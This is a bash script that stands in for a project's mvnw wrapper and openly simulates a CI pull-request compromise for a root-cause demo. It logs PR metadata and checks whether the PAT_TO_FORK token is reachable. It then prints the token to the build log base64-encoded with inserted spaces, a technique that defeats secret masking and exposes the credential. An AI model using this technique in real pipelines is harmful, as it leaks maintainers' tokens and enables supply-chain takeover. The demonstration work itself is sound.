#!/usr/bin/env bash
set -euo pipefail

echo "SIMULATED_ATTACK_CONTROL_REACHED"
echo "The pull request changed mvnw, and CI executed it."
echo "The command looked like a normal build: $*"
echo "attacker_control=true"

mkdir -p .rca-demo
evidence_file=".rca-demo/evidence.txt"

{
  echo "simulated_stage=initial-pr-compromise"
  echo "attacker_control=true"
  echo "base_repository=${BASE_REPOSITORY:-unknown}"
  echo "head_repository=${HEAD_REPOSITORY:-unknown}"
  echo "head_sha=${HEAD_SHA:-unknown}"
  echo "pr_number=${PR_NUMBER:-unknown}"
} > "$evidence_file"

if [[ -n "${PAT_TO_FORK:-}" ]]; then
  echo "PAT_TO_FORK_VISIBLE=true"
  echo "PAT_TO_FORK_LENGTH=${#PAT_TO_FORK}"
  printf 'canary_b64=%s\n' "$(printf '%s' "$PAT_TO_FORK" | base64 | tr -d '\n' | sed 's/../& /g')"
  {
    echo "canary_secret_present=true"
    echo "canary_secret_length=${#PAT_TO_FORK}"
    printf "%s" "$PAT_TO_FORK" | sha256sum | awk '{ print "canary_secret_sha256_prefix=" substr($1, 1, 16) }'
  } >> "$evidence_file"
else
  echo "PAT_TO_FORK_VISIBLE=false"
  echo "canary_secret_present=false" >> "$evidence_file"
fi

cat >> "$evidence_file" <<'EOT'
simulated_stage_2=would_invite_disposable_user_or_push_workflow
simulated_stage_3=would_reuse_maintainer_token_against_related_repo
simulated_stage_4=would_move_trusted_tag_to_malicious_commit
external_exfiltration=false
EOT